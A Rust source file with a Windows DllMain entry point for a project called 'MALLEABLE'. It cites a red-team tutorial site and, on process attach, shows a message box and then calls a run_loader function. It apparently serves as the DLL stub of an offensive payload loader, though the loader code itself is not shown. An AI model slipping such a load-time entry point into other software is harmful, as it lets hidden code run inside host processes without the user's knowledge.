#[cfg(target_os = "windows")]
use windows::{Win32::UI::WindowsAndMessaging::{MessageBoxA, MB_OK}, Win32::System::SystemServices::*,};
#[cfg(target_os = "windows")]
use windows::core::s;

//https://fluxsec.red/rust-dll-windows-api
// cargo build --target x86_64-pc-windows-gnu --lib --release


#[cfg(feature = "loader")]
#[cfg(feature = "dll")]
use crate::execmode::executable::run_loader;


#[no_mangle]
#[allow(non_snake_case)]
#[cfg(target_os = "windows")]
fn DllMain(_: usize, dw_reason: u32, _: usize) -> i32 {
    match dw_reason {
        DLL_PROCESS_ATTACH => attach(),
        _ => (),
    }

    1
}

#[cfg(target_os = "windows")]
fn attach() {
    unsafe {
        MessageBoxA(None, s!("Hello from MALLEABLE"), s!("MALLEABLE"), MB_OK);
        run_loader();
    }
}